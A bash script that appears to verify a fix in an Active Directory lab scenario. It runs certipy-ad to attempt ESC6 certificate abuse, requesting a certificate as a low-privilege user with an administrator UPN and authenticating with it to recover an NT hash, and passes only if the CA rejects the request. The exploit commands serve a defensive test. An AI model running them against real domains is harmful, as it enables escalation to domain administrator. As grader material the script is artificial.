#!/usr/bin/env bash
# meta4/ad-vm/scenario-10/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce a SAN=administrator UPN cert via ESC6.

set -euo pipefail
cd "$(mktemp -d)"

REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'User' \
    -upn 'administrator@corp.local' 2>&1 || true)
echo "--- certipy req ---"
echo "$REQ"

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- certipy auth ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-10] ESC6 still open -- SAN override accepted, NT hash recovered" >&2
        exit 1
    fi
fi

if echo "$REQ" | grep -qiE 'access_denied|enrollment.*denied|invalid.*request|denied by policy'; then
    echo "[verify-poc-10] CA rejected SAN override -- BLOCKED"
    exit 0
fi
echo "[verify-poc-10] no admin PFX, no NT hash -- treating as BLOCKED"
exit 0
